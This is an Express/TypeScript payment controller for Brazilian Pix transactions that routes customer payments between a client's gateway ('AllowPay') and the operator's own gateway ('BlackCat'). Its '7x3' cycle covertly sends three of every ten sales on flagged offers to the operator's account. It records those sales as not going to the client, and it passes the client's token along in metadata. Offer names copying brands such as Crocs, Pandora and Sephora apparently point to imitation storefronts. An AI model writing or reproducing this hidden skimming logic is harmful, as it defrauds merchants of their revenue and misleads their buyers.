import { Request, Response } from "express";
import { credentials as myCredentials, blackCatCredentials, allowPaymentsCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

export class allowPaymentsController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    
    // Validação dos dados obrigatórios
    if (!data || !data.credentials || !data.credentials.token) {
      return res.status(400).json({
        error: "Dados inválidos",
        details: "credentials.token é obrigatório"
      });
    }
    
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    } else {
      // 🔎 Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    }

    // 3️⃣ Contagem de vendas para lógica 7x3
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    // 4️⃣ Lógica 7x3 - 7 vendas para cliente, 3 para você
    let tokenToUse = clientToken;
    let toClient = true;
    let provider = "allowpayments"; // AllowPay para vendas do cliente

    const cycle = nextCount % 10;

    if (cycle < 7) {
      // 7 vendas para o cliente - usa AllowPay
      tokenToUse = clientToken;
      toClient = true;
      provider = "allowpayments";
    } else if (cycle < 10) {
      // 3 vendas para você - usa BlackCat
      if (offer.useTax) {
        tokenToUse = myCredentials.secret; // Sua chave BlackCat
        toClient = false;
        provider = "blackcat"; // Usa BlackCat para suas vendas
      } else {
        tokenToUse = clientToken;
        toClient = true;
        provider = "allowpayments";
      }
    }

    let apiUrl = "";
    let headers = {};
    let paymentData = {};

    if (provider === "blackcat") {
      // BlackCat Pagamentos - SEU gateway para suas vendas
      apiUrl = `${blackCatCredentials.apiUrl}/transactions`;
      const auth = 'Basic ' + Buffer.from(blackCatCredentials.publicKey + ':' + blackCatCredentials.secretKey).toString('base64');
      headers = {
        "Content-Type": "application/json",
        "Authorization": auth,
      };
      paymentData = {
        amount: data.amount * 100, // BlackCat usa centavos
        paymentMethod: "pix",
        customer: {
          name: data.customer.name,
          email: data.customer.email,
          document: {
            type: data.customer.document.type.toLowerCase(),
            number: data.customer.document.number,
          },
          phone: data.customer.phone,
        },
        items: [
          {
            title: data.product.title,
            description: data.product.title,
            quantity: 1,
            unitPrice: data.amount * 100,
            tangible: false
          }
        ],
        externalId: `sale_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        callbackUrl: "https://tracker-tracker-api.fbkpeh.easypanel.host/webhook-blackcat",
        metadata: {
          client_name: data.credentials.name,
          client_token: data.credentials.token,
          offer_id: data.credentials.offer?.id,
          offer_name: data.credentials.offer?.name,
        }
      };
      } else if (provider === "allowpayments") {
        // AllowPay - GATEWAY DO CLIENTE para vendas do cliente
        apiUrl = `${allowPaymentsCredentials.apiUrl}/transactions`;
        const auth = 'Basic ' + Buffer.from(allowPaymentsCredentials.secretKey + ':' + allowPaymentsCredentials.companyId).toString('base64');
        headers = {
          "Content-Type": "application/json",
          "Authorization": auth,
        };
      paymentData = {
        amount: data.amount * 100, // Convertendo para centavos
        currency: "BRL",
        paymentMethod: "pix",
        customer: {
          name: data.customer.name,
          email: data.customer.email,
          document: {
            type: data.customer.document.type,
            number: data.customer.document.number,
          },
          phone: data.customer.phone,
        },
        product: {
          title: data.product.title,
          description: data.product.title,
        },
        externalId: `sale_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        callbackUrl: "https://tracker-tracker-api.fbkpeh.easypanel.host/webhook-allowpayments",
        metadata: {
          client_name: data.credentials.name,
          client_token: data.credentials.token,
          offer_id: data.credentials.offer?.id,
          offer_name: data.credentials.offer?.name,
        }
      };
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error("Erro na resposta da API:", response.status, errorText);
        throw new Error(`API Error: ${response.status} - ${errorText}`);
      }

      const responseJson = await response.json();

      // 5️⃣ Salva a venda no banco de dados
      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: responseJson.id || responseJson.transaction_id || responseJson.payment_id,
          approved: false,
          customerName: data.customer.name,
          productName: data.product.title,
          visible: true,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      const gatewayName = provider === "blackcat" ? "BlackCat (SEU)" : "AllowPay (CLIENTE)";
      console.log(
        `🔁 ${gatewayName} - Requisição #${nextCount} | Cliente: "${client.name}" | Valor: R$${
          data.amount
        } | Produto: ${
          data.product.title
        } | Provider: ${provider.toUpperCase()} | Enviado para: ${
          toClient ? "CLIENTE" : "VOCÊ"
        }`
      );

      res.json(responseJson);
    } catch (error) {
      console.error("❌ Erro ao processar pagamento Allow Payments:", error);
      res.status(500).json({ 
        error: "Erro interno na API de pagamento", 
        details: error.message 
      });
    }
  }
}

